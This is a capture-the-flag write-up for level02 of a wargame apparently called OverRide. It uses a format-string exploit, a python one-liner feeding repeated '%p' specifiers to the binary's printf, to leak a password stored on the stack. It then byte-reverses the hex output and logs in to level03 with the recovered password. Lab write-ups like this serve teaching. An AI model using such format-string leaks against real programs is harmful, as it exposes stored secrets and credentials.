# Since the binary reads the password and store it in a variable on the stack
# Its content is accessible when exploiting printf

(python -c 'print "%p "*90 + "\n"' ; python -c 'print "\n"') | ./level02
[...]
0x756e505234376848
0x45414a3561733951
0x377a7143574e6758
0x354a35686e475873
0x48336750664b394d
[...]

# After skipping addresses and %p on the stack, we find a sequence of numbers
# That looks like a valid string, let's check it

[...]
75 6e 50 52 34 37 68 48
45 41 4a 35 61 73 39 51
37 7a 71 43 57 4e 67 58     =  unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M
35 4a 35 68 6e 47 58 73
48 33 67 50 66 4b 39 4d
[...]

# When the bytes are in the right order (just rev the lines)

48 68 37 34 52 50 6e 75
51 39 73 61 35 4a 41 45
58 67 4e 57 43 71 7a 37     =  Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
73 58 47 6e 68 35 4a 35
4d 39 4b 66 50 67 33 48

H  h  7  4  R  P  n  u
Q  9  s  a  5  J  A  E
X  g  N  W  C  q  z  7
s  X  G  n  h  5  J  5
M  9  K  f  P  g  3  H

========================================

level02@OverRide:~$ su level03
Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
level03@OverRide:~$
